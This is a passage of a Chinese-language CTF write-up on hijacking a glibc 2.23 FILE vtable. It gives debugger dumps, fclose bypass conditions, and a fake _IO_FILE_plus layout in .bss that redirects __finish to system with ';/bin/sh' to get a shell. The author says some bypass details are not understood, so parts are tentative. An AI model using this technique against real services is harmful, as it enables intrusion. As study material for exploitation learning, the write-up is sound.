class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>程序运行时的情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;_IO_file_jumps</span><br><span class="line">$<span class="number">28</span> = (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *) <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_jump_t *)<span class="number">0xf7fb6ac0</span></span><br><span class="line">$<span class="number">27</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>, </span><br><span class="line">  __dummy2 = <span class="number">0</span>, </span><br><span class="line">  __finish = <span class="number">0xf7e6d990</span> &lt;_IO_new_file_finish&gt;, </span><br><span class="line">  __overflow = <span class="number">0xf7e6e3b0</span> &lt;_IO_new_file_overflow&gt;, </span><br><span class="line">  __underflow = <span class="number">0xf7e6e150</span> &lt;_IO_new_file_underflow&gt;, </span><br><span class="line">  __uflow = <span class="number">0xf7e6f230</span> &lt;__GI__IO_default_uflow&gt;, </span><br><span class="line">  __pbackfail = <span class="number">0xf7e700c0</span> &lt;__GI__IO_default_pbackfail&gt;, </span><br><span class="line">  __xsputn = <span class="number">0xf7e6d600</span> &lt;_IO_new_file_xsputn&gt;, </span><br><span class="line">  __xsgetn = <span class="number">0xf7e6d210</span> &lt;__GI__IO_file_xsgetn&gt;, </span><br><span class="line">  __seekoff = <span class="number">0xf7e6c4b0</span> &lt;_IO_new_file_seekoff&gt;, </span><br><span class="line">  __seekpos = <span class="number">0xf7e6f4d0</span> &lt;_IO_default_seekpos&gt;, </span><br><span class="line">  __setbuf = <span class="number">0xf7e6c2f0</span> &lt;_IO_new_file_setbuf&gt;, </span><br><span class="line">  __sync = <span class="number">0xf7e6c1e0</span> &lt;_IO_new_file_sync&gt;, </span><br><span class="line">  __doallocate = <span class="number">0xf7e618d0</span> &lt;__GI__IO_file_doallocate&gt;, </span><br><span class="line">  __read = <span class="number">0xf7e6d5b0</span> &lt;__GI__IO_file_read&gt;, </span><br><span class="line">  __write = <span class="number">0xf7e6d060</span> &lt;_IO_new_file_write&gt;, </span><br><span class="line">  __seek = <span class="number">0xf7e6cda0</span> &lt;__GI__IO_file_seek&gt;, </span><br><span class="line">  __close = <span class="number">0xf7e6c2c0</span> &lt;__GI__IO_file_close&gt;, </span><br><span class="line">  __stat = <span class="number">0xf7e6d040</span> &lt;__GI__IO_file_stat&gt;, </span><br><span class="line">  __showmanyc = <span class="number">0xf7e70250</span> &lt;_IO_default_showmanyc&gt;, </span><br><span class="line">  __imbue = <span class="number">0xf7e70260</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>因为当前版本还是 2.23，可以直接修改虚表，但是为了方便还是修改修改 fd 里面的指针，指向一个伪造虚表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">bss:<span class="number">0804B</span>260 name            db <span class="number">20</span>h <span class="title function_">dup</span><span class="params">(?)</span>           ; DATA XREF: main+<span class="number">9F</span>↑o</span><br><span class="line">.bss:<span class="number">0804B</span>260                                         ; main+B4↑o</span><br><span class="line">.bss:<span class="number">0804B</span>280                 public fp</span><br><span class="line">.bss:<span class="number">0804B</span>280 ; FILE *fp</span><br><span class="line">.bss:<span class="number">0804B</span>280 fp              dd ?                    ; DATA XREF: openfile+<span class="number">6</span>↑r</span><br><span class="line">.bss:<span class="number">0804B</span>280                                         ; openfile+AD↑w ...</span><br><span class="line">.bss:<span class="number">0804B</span>280 _bss            ends</span><br><span class="line">.bss:<span class="number">0804B</span>280</span><br><span class="line">.prgend:<span class="number">0804B</span>284 ; ===========================================================================</span><br><span class="line">.prgend:<span class="number">0804B</span>284</span><br><span class="line">.prgend:<span class="number">0804B</span>284 ; Segment type: Zero-length</span><br><span class="line">.prgend:<span class="number">0804B</span>284 _prgend         segment byte public <span class="string">&#x27;&#x27; use32</span></span><br><span class="line"><span class="string">.prgend:0804B284 _end            label byte</span></span><br><span class="line"><span class="string">.prgend:0804B284 _prgend         ends</span></span><br><span class="line"><span class="string">.prgend:0804B284</span></span><br><span class="line"><span class="string">extern:0804B288 ; ===========================================================================</span></span><br><span class="line"><span class="string">extern:0804B288</span></span><br><span class="line"><span class="string">extern:0804B288 ; Segment type: Externs</span></span><br><span class="line"><span class="string">extern:0804B288 ; extern</span></span><br><span class="line"><span class="string">extern:0804B288 ; char *strstr(const char *haystack, const char *needle)</span></span><br><span class="line"><span class="string">extern:0804B288                 extrn strstr:near       ; CODE XREF: _strstr↑j</span></span><br><span class="line"><span class="string">extern:0804B288                                         ; DATA XREF: .got.plt:off_804B00C↑o</span></span><br><span class="line"><span class="string">extern:0804B28C ; int printf(const char *format, ...)</span></span><br><span class="line"><span class="string">extern:0804B28C                 extrn printf:near       ; CODE XREF: _printf↑j</span></span><br><span class="line"><span class="string">extern:0804B28C                                         ; DATA XREF: .got.plt:off_804B010↑o</span></span><br><span class="line"><span class="string">extern:0804B290 ; int fclose(FILE *stream)</span></span><br><span class="line"><span class="string">extern:0804B290                 extrn fclose:near       ; CODE XREF: _fclose↑j</span></span><br><span class="line"><span class="string">extern:0804B290                                         ; DATA XREF: .got.plt:off_804B014↑o</span></span><br><span class="line"><span class="string">extern:0804B294 ; __sighandler_t signal(int sig, __sighandler_t handler)</span></span><br><span class="line"><span class="string">extern:0804B294                 extrn signal:near       ; CODE XREF: _signal↑j</span></span><br><span class="line"><span class="string">extern:0804B294                                         ; DATA XREF: .got.plt:off_804B018↑o</span></span><br><span class="line"><span class="string">extern:0804B298 ; unsigned int alarm(unsigned int seconds)</span></span><br><span class="line"><span class="string">extern:0804B298                 extrn alarm:near        ; CODE XREF: _alarm↑j</span></span><br><span class="line"><span class="string">extern:0804B298                                         ; DATA XREF: .got.plt:off_804B01C↑o</span></span><br><span class="line"><span class="string">extern:0804B29C ; size_t fread(void *ptr, size_t size, size_t n, FILE *stream)</span></span><br><span class="line"><span class="string">extern:0804B29C                 extrn fread:near        ; CODE XREF: _fread↑j</span></span><br><span class="line"><span class="string">extern:0804B29C                                         ; DATA XREF: .got.plt:off_804B020↑o</span></span><br><span class="line"><span class="string">extern:0804B2A0 ; int puts(const char *s)</span></span><br><span class="line"><span class="string">extern:0804B2A0                 extrn puts:near         ; CODE XREF: _puts↑j</span></span><br><span class="line"><span class="string">extern:0804B2A0                                         ; DATA XREF: .got.plt:off_804B024↑o</span></span><br><span class="line"><span class="string">extern:0804B2A4 ; void exit(int status)</span></span><br><span class="line"><span class="string">extern:0804B2A4                 extrn exit:near         ; CODE XREF: _exit↑j</span></span><br><span class="line"><span class="string">extern:0804B2A4                                         ; DATA XREF: .got.plt:off_804B028↑o</span></span><br><span class="line"><span class="string">extern:0804B2A8 ; char *strchr(const char *s, int c)</span></span><br><span class="line"><span class="string">extern:0804B2A8                 extrn strchr:near       ; CODE XREF: _strchr↑j</span></span><br><span class="line"><span class="string">extern:0804B2A8                                         ; DATA XREF: .got.plt:off_804B02C↑o</span></span><br><span class="line"><span class="string">extern:0804B2AC ; int __cdecl _libc_start_main(int (__cdecl *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end)</span></span><br><span class="line"><span class="string">extern:0804B2AC                 extrn __libc_start_main:near</span></span><br><span class="line"><span class="string">extern:0804B2AC                                         ; CODE XREF: ___libc_start_main↑j</span></span><br><span class="line"><span class="string">extern:0804B2AC                                         ; DATA XREF: .got.plt:off_804B030↑o</span></span><br><span class="line"><span class="string">extern:0804B2B0 ; int setvbuf(FILE *stream, char *buf, int modes, size_t n)</span></span><br><span class="line"><span class="string">extern:0804B2B0                 extrn setvbuf:near      ; CODE XREF: _setvbuf↑j</span></span><br><span class="line"><span class="string">extern:0804B2B0                                         ; DATA XREF: .got.plt:off_804B034↑o</span></span><br><span class="line"><span class="string">extern:0804B2B4 ; FILE *fopen(const char *filename, const char *modes)</span></span><br><span class="line"><span class="string">extern:0804B2B4                 extrn fopen:near        ; CODE XREF: _fopen↑j</span></span><br><span class="line"><span class="string">extern:0804B2B4                                         ; DATA XREF: .got.plt:off_804B038↑o</span></span><br><span class="line"><span class="string">extern:0804B2B8 ; void *memset(void *s, int c, size_t n)</span></span><br><span class="line"><span class="string">extern:0804B2B8                 extrn memset:near       ; CODE XREF: _memset↑j</span></span><br><span class="line"><span class="string">extern:0804B2B8                                         ; DATA XREF: .got.plt:off_804B03C↑o</span></span><br><span class="line"><span class="string">extern:0804B2BC                 extrn __isoc99_scanf:near</span></span><br><span class="line"><span class="string">extern:0804B2BC                                         ; CODE XREF: ___isoc99_scanf↑j</span></span><br><span class="line"><span class="string">extern:0804B2BC                                         ; DATA XREF: .got.plt:off_804B040↑o</span></span><br><span class="line"><span class="string">extern:0804B2C0 ; int atoi(const char *nptr)</span></span><br><span class="line"><span class="string">extern:0804B2C0                 extrn atoi:near         ; CODE XREF: _atoi↑j</span></span><br><span class="line"><span class="string">extern:0804B2C0                                         ; DATA XREF: .got.plt:off_804B044↑o</span></span><br><span class="line"><span class="string">extern:0804B2C4                 extrn __imp___gmon_start__:near ; weak</span></span><br><span class="line"><span class="string">extern:0804B2C4                                         ; CODE XREF: __gmon_start__↑j</span></span><br><span class="line"><span class="string">extern:0804B2C4                                         ; DATA XREF: .got:__gmon_start___ptr↑o</span></span><br><span class="line"><span class="string">extern:0804B2C4</span></span><br><span class="line"><span class="string">extern:0804B2C4</span></span><br><span class="line"><span class="string">extern:0804B2C4                 end _start</span></span><br></pre></td></tr></table></figure>
<p>我们产看内存空间发现，在 fp 后有足够多的空间来放我们的 fake_file（虽然 filename 也很大，但是文件名只可以读取 63 字节）. 所以我们将 file 放在此处，同时伪造的时候要注意如何跳过 fclose 的一些检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">//可以看到当_IO_IS_FILEBUF位为0时，函数不会执行_IO_un_link和_IO_file_close_it函数，而直接执行_IO_FINISH函数。在_IO_FINISH函数中会直接调用vtable中的__finish函数。其中_IO_IS_FILEBUF被定义为0x2000。_flags &amp; 0x2000为0就会直接调用_IO_FINSH(fp)，_IO_FINISH(fp)相当于调用fp-&gt;vtabl-&gt;__finish(fp)；对于不同的函数，检查可能时不一样的，这就需要libc源码分析了。</span></span><br><span class="line"><span class="comment">//此外还有其他的绕过方法</span></span><br><span class="line"><span class="comment">//这里我并不清楚这些绕过都是什么，待后续学习</span></span><br><span class="line"><span class="number">1.</span>((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   </span><br><span class="line"><span class="comment">//或者是</span></span><br><span class="line"><span class="number">2.</span></span><br><span class="line">_IO_vtable_offset (fp) == <span class="number">0</span> </span><br><span class="line">&amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> </span><br><span class="line">&amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">   </span><br><span class="line">flag&amp;<span class="number">8</span> = <span class="number">0</span> and flag &amp;<span class="number">2</span> =<span class="number">0</span> and flag &amp; <span class="number">0x8000</span> != <span class="number">0</span></span><br><span class="line">所以flag的值可以为<span class="number">0xfbad8000</span> 或者<span class="number">0xfbad8080</span></span><br><span class="line">  <span class="comment">//unlink与io_FILE_plus 联合使用https://www.jianshu.com/p/1e45b785efc1</span></span><br></pre></td></tr></table></figure>
<p>在执行 fclose 时会执行 unlink 等一些操作，同时会 free 我们开启的 fp 堆块以及储存数据的堆块，如果因为这两个堆块都比较大，检查是否与 topchunk 相邻，然年进行 free, 因为储存数据的堆块与 topchunk 相连，而且其在 file 堆块前释放，所以两个都会合并到 topchunk.fclose 会对 file_plus 的数据进处理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *)<span class="number">0x804c410</span></span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72539124</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = <span class="number">-1</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x804c4a8</span>, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x804c4b4</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">-1</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">39</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>继续我们上述的绕过检查，我们修改其的相关参数后释放</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x804c408</span> PREV_INUSE &#123;					<span class="comment">//IO_FILE_plus 堆块</span></span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">353</span>, </span><br><span class="line">  fd = <span class="number">0xf7fb77b0</span> &lt;main_arena+<span class="number">48</span>&gt;, </span><br><span class="line">  bk = <span class="number">0xf7fb77b0</span> &lt;main_arena+<span class="number">48</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x804c570</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x804c570</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x804c568</span> &#123;</span><br><span class="line">  prev_size = <span class="number">352</span>, </span><br><span class="line">  size = <span class="number">4104</span>, </span><br><span class="line">  fd = <span class="number">0x61616161</span>, </span><br><span class="line">  bk = <span class="number">0x61616161</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x61616161</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0xa6161</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x804d570</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">129681</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *)<span class="number">0x804c410</span></span><br><span class="line">$<span class="number">5</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-134514768</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0xf7fb77b0</span> &lt;main_arena+<span class="number">48</span>&gt; <span class="string">&quot;p\325\004\b&quot;</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x804d570</span> <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = <span class="number">3</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x804c4a8</span>, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x804c4b4</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">-1</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">39</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到，此时只是对 file 堆块进行了释放，而没有对其数据进行清空，io_read_ptr 变为了 main_arena, 这是因为其加入了 unsortedbins, 但是这块是或否执行了 unlink 操作呢？但是我们看到了储存数据的堆块并没有进行 free 操作。这里这样操作，如果存在 UAF 是否可以实现泄露数据呢？</p>
<p>泄露地址的操作，在进行数据泄露的时候除了程序的内存表，还可以利用环境的相关内容。通过打开 /proc/self/mmap 这个虚拟文件来获取当前进程的地址空间情况，</p>
</li>
<li></li>
</ol>
<p>整体思路：1. 泄露 libc 地址，获取 system 函数的真实地址</p>
<p>​	2. 利用 fp 后面的 bss 伪造 file_plus 的结构体（）这部分内存全是空的</p>
   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">name:<span class="number">0x0</span>,				<span class="comment">//0x20字节</span></span><br><span class="line">	<span class="number">0x0</span>,</span><br><span class="line">	<span class="number">0x0</span>,</span><br><span class="line">	<span class="number">0x0</span>,</span><br><span class="line">fp:fake_file_start </span><br><span class="line"><span class="comment">//下面时伪造的file</span></span><br><span class="line">flags_:<span class="number">0xffffdfff</span>			<span class="comment">//fake_file_start</span></span><br><span class="line">_io_read_ptr:<span class="string">&quot;;/bin/sh&quot;</span></span><br><span class="line"><span class="comment">//下面就可以全是0</span></span><br><span class="line">vtable:fake_file_start+<span class="number">0x94</span>+<span class="number">4</span> </span><br><span class="line"><span class="comment">//fake_vatable   fclose偏移为2</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy)：<span class="number">0</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2)）：<span class="number">0</span></span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish)：system_addr</span><br><span class="line"> <span class="comment">//剩下的全写0</span></span><br></pre></td></tr></table></figure>
<p>调用_IO_FINSH (fp)，_IO_FINISH (fp) 相当于调用 fp-&gt;vtabl-&gt;__finish (fp)，此时实际上执行的 system (fp);</p>
<p>因此此时的 fp 指针其实就是 system 的参数，虽然 fp 并未直接指向 &quot;/bin/sh&quot;, 但是 system 解析指令的时，无法解析 0xffffdfff，便会继续向后检查，这里除了写”;bin/sh“, 话可以有”||/bin/sh“, 覆盖后面的指针也问题不大</p>
